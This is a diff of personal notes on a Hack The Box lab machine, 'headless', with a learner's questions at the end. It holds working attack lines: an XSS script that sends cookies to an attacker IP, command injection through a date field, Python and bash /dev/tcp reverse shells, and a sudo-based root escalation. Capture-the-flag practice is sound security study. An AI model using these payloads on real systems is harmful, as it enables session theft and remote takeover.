@@ -1,14 +1,44 @@
+Initial Info:
+    * NMAP scan results:
+        - 22/tcp  open  ssh  OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+        - 5000/tcp  open  upnp?
 
-* NMAP scan results:
-    - 22/tcp  open  ssh  OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
-    - 5000/tcp  open  upnp?
-
-* Dirbuster results:
-    - http://headless.htb:5000/dashboard (CODE:500|SIZE:265)
-    - http://headless.htb:5000/support (CODE:200|SIZE:2363)
+    * Dirbuster results:
+        - http://headless.htb:5000/dashboard (CODE:500|SIZE:265)
+        - http://headless.htb:5000/support (CODE:200|SIZE:2363)
     
-* Web Technologies:
-    - flask 2.2.2
-    - python 3.11.2
+    * Web Technologies:
+        - flask 2.2.2
+        - python 3.11.2
 
- 
+1. Cookie stealing on headless.htb:5000/support form:
+    a) placing script in user agent and message field
+        - COOKIE_STEAL_SCRIPT:: <script>var i=new Image(); i.src="http://10.10.14.154:8001/?cookie="+btoa(document.cookie);</script>
+        - lISTENER_COMMAND:: python -m http.server 8001
+        - STOLEN_COOKIE:: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
+
+2. gaining access to console with reverse shell via burpsuite on headless.htb:5000/dashboard:
+    a) used burpsuite interceptor to input stolen cookie to access website date/time formated form
+    b) appended "; ls" to end of date formated input through burp repeater to test command and it worked
+    c) used reverse shell website and found a python format that worked and gave me access to the console
+        - REVERSE_SHELL_CMD:: export RHOST="10.10.14.104";export RPORT=2357;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+        - LISTENER:: nc -lvnp 2357
+    d) found user flag in text file
+
+3. privledge escalation through syscheck command:
+    a) ran "sudo -l" and found syscheck command that requires no password
+    b) cat out syscheck file and showed that it is running initdb.sh file
+    c) used reverse shell website again in bash format and ran echo'd it into initdb.sh with my own ip
+        - echo "sh -i >& /dev/tcp/10.10.14.104/1337 0>&1" > initdb.sh
+        - LISTENER$ nc -lvnp 1337
+    d) "sudo syscheck" ran this with elevated privledges without needing a password
+        - gained root shell through listener
+    e) found root flag in /root in text file
+
+
+Questions:
+    1. why did inputting cookie steal script in user agent and message field work but one or the other didn't
+    2. when trying the reverse shell within initdb.sh, replacing just ip with own ip seemed to connect but nothing would output
+        - other formats for reverse shell from website would do same thing
+    3. there was no password when running "sudo -l" and there is when running it on my own system, is this due to hackthebox permissions that are set up?
+   
